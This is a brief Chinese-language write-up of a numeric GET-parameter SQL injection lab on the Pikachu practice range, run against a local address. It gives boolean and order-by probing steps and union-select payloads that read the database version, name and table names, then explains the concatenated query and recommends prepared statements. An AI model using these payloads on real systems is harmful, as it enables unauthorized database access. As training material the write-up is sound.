# Pikachu | SQL注入 数字型（GET）
## 一、漏洞简介
后端SQL语句直接拼接数字参数，没有预编译。不需要单引号闭合。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/sqli/sqli_id.php
## 三、复现步骤
1. url参数 id=1，正常回显用户信息
2. 测试判断：id=1 and 1=1 正常；id=1 and 1=2 无数据 → 判断存在注入
3. 判断字段数：`id=1 order by 3`正常，`order by 4`报错 → 3列
4. 联合查询：`id=-1 union select 1,version(),database()`
## 四、Payload
查库：`id=-1 union select 1,version(),database()`
查表：`id=-1 union select 1,2,table_name from information_schema.tables where table_schema=database()`
## 五、漏洞原理
后端SQL：`select * from user where id=$id`，变量直接拼接，无过滤无预编译。
## 六、修复方案
使用PDO预编译参数化查询；输入校验。
## 七、总结
数字型注入：参数不用引号包裹。